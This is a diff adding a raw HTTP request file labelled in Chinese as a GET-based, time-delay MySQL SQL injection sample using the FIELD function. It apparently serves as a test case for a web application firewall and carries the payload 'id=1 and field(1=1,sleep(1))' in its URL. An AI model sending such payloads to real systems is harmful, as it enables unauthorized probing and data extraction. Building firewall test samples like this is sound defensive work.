@@ -1,0 +1,9 @@
+# SQL注入_GET_mysql_延时注入(FIELD函数利用)
+# 基于延时注入,该 SQL 注入语句的攻击目的是通过利用数据库的漏洞，通过时间得长短判断当前命令是否成功执行
+GET /?id=1%20and%20field%281=1%2Csleep%281%29%29&bid=hd_tag_m8mv256u HTTP/1.1
+Host: www.swaf.com
+RM-PRO-BusinessID: hd_tag_m8mv256u
+RM-PRO-Token: 2be189fa2646296276794c874d440726
+RM-PRO-Time: 1742808446085
+User-Agent: curl/7.83.1
+
